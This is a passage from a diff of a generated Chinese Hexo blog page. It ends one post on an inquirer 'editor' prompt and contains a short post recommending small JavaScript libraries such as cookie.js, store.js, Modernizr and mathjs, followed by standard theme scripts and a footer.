+<h4 id="8-editor"><a href="#8-editor" class="headerlink" title="8. editor"></a>8. editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const promptList &#x3D; [&#123;</span><br><span class="line">    type: &quot;editor&quot;,</span><br><span class="line">    message: &quot;请输入备注：&quot;,</span><br><span class="line">    name: &quot;editor&quot;</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure>
+
+<p>效果：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-62296d4127f98eb3?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="editor_inset"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/10024246-605305e7f9b0354a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="editor_res"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lzhwweb.github.io/nirvana/javascript/%E5%89%8D%E7%AB%AF/javascript%E8%BF%B7%E4%BD%A0%E5%BA%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/nirvana/images/avatar.gif">
+      <meta itemprop="name" content="nirvana">
+      <meta itemprop="description" content="个人学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="涅槃快乐是金">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/javascript%E8%BF%B7%E4%BD%A0%E5%BA%93/" class="post-title-link" itemprop="url">javascript迷你库</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-03-11 21:12:40" itemprop="dateCreated datePublished" datetime="2021-03-11T21:12:40+08:00">2021-03-11</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-10 13:14:04" itemprop="dateModified" datetime="2021-03-10T13:14:04+08:00">2021-03-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/nirvana/categories/javascript/" itemprop="url" rel="index"><span itemprop="name">javascript</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>这些库的共性是非常小，而且功能单一。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/js-coder/cookie.js">cookie.js</a></strong></p>
+<p>如果你操作过cookie的接口，那么你一定会感觉这东西的规范真的是太复杂了，根本记不住啊，其实你是对的，因为cookie的接口设计的是有问题的，也就是说设计的太底层了，根本不友好，那么来试试这个js库吧。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/marcuswestin/store.js">store.js</a></strong></p>
+<p>再来说说浏览器的localStore吧，这东西太赞了，可惜尼玛每个浏览器都实现的各不相同，我也是醉了，如果你也有同样的烦恼，不如来试试这个迷你库，它有更简单的api，最重要的是他解决了跨浏览器问题，甚至解决了低版本浏览器(ie6)不支持localStore的问题。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/yanhaijing/data.js">data.js</a></strong></p>
+<blockquote>
+<p>data.js 是带有消息通知的数据中心，我称其为会说话的数据。旨在让编程变得简单，世界变得美好</p>
+</blockquote>
+<p>如果你使用模块化编程，或者在node环境下的话，你一定纠结过不同模块间到底如何共享数据的问题（虽然这是反模式），全局变量。。。那么试试这个迷你库吧，简单可以来，会让你消除上面的烦恼问题，同时他还支持消息，当数据更新时，会发出消息。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/yanhaijing/template.js">template.js</a></strong></p>
+<blockquote>
+<p>template.js 一款javascript模板引擎，简单，好用。</p>
+</blockquote>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/yanhaijing/lodjs">lodJS</a></strong></p>
+<blockquote>
+<p>JavaScript模块加载器，基于AMD。迄今为止，对AMD理解最好的实现</p>
+</blockquote>
+<p><strong><a target="_blank" rel="noopener" href="http://lab.ejci.net/favico.js/">favico.js</a></strong></p>
+<p>在favico上添加数字书不是很nice，点击下面的官网查看效果，这肯定要逼死强迫症了。</p>
+<p>**<a target="_blank" rel="noopener" href="http://lab.ejci.net/favico.js/">官网</a>**。</p>
+<p><strong><a target="_blank" rel="noopener" href="http://modernizr.com/">Modernizr</a></strong></p>
+<p>这个就不过多解释了，各种html css js检测器，功能检测哦。</p>
+<p><strong><a target="_blank" rel="noopener" href="http://visionmedia.github.io/move.js/">Move.js</a></strong></p>
+<p>如果你操作过css3的属性，一定会觉得非常痛苦的，那不如来试试合格，css3动画瞬间变得简单了。</p>
+<p><strong><a target="_blank" rel="noopener" href="http://dmauro.github.io/Keypress/">Keypress</a></strong></p>
+<p>一定记不住键盘上每个键的键位码吧，来试试这个，直观的展示，再也不需要记忆了。</p>
+<p><strong><a target="_blank" rel="noopener" href="http://matthewhudson.me/projects/device.js/">device.js</a></strong></p>
+<p>你想检测用户的设备，试试这个吧，比jq.browser全面多了。</p>
+<p><strong><a target="_blank" rel="noopener" href="http://arasatasaygin.github.io/is.js/">is.js</a></strong></p>
+<p>迷你检查库，这个几乎涵盖了全部的各种检测。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/es-shims/es5-shim">es5-shim</a></strong></p>
+<p>还没使用es5，只能鄙视你了，担心兼容性，用这个吧，主要是为了es6打基础啊。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/jakearchibald/es6-promise">es6-promise</a></strong></p>
+<p>promise太好用了，兼容性问题靠这个全解决了。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/wagerfield/parallax">parallax</a></strong></p>
+<p>先来看个视差效果的<a target="_blank" rel="noopener" href="http://zhidao.baidu.com/s/10year/index.html">demo</a>，是不是很赞，如果你也想实现这个效果，那么来试试这个吧。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/jaredreich/notie.js">notie.js</a></strong></p>
+<p>还在使用弹窗通知用户，太low了，快来试试这款非阻塞式，小清新的通知插件吧，对移动端有好，界面好到爆炸啊。</p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/overtrue/share.js">share.js</a></strong></p>
+<blockquote>
+<p>一键分享到微博、QQ空间、QQ好友、微信、腾讯微博、豆瓣、Facebook、Twitter、Linkedin、Google+、点点等社交网站。</p>
+</blockquote>
+<p>如果你受够了分享组件的烦恼，那么来试试这个对移动端有好的分享组件吧，界面优美，看起来很赞。</p>
+<p><a target="_blank" rel="noopener" href="http://overtrue.me/share.js/">demo</a></p>
+<p><strong><a target="_blank" rel="noopener" href="https://github.com/josdejong/mathjs">mathjs</a></strong></p>
+<p>js自带的数学运算不能满足你的需求了，那试试这个，扩展了很多数学运算。</p>
+<p>这里是<a target="_blank" rel="noopener" href="http://mathjs.org/">官网</a>。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-9777fdb7c06afbdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/nirvana/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/nirvana/">1</a><span class="space">&hellip;</span><a class="page-number" href="/nirvana/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/nirvana/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/nirvana/page/18/">18</a><a class="extend next" rel="next" href="/nirvana/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nirvana</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">540k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">8:11</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/nirvana/js/utils.js"></script><script src="/nirvana/js/motion.js"></script><script src="/nirvana/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
